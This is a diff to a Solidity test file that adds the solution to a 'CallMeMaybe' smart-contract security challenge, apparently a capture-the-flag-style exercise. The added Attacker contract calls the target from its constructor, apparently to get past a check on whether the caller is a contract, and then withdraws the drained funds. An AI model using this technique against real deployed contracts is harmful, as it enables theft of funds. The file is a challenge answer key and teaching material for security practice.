@@ -15,7 +15,8 @@ contract CallMeMaybeTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        Attacker attacker = new Attacker(payable(address(instance)));
+        attacker.withdraw();
 
         checkSuccess();
     }
@@ -23,4 +24,16 @@ contract CallMeMaybeTest is BaseTest {
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
     }
+}
+
+contract Attacker {
+    constructor(address payable _target) payable {
+        CallMeMaybe(_target).hereIsMyNumber();
+    }
+
+    function withdraw() public {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
 }
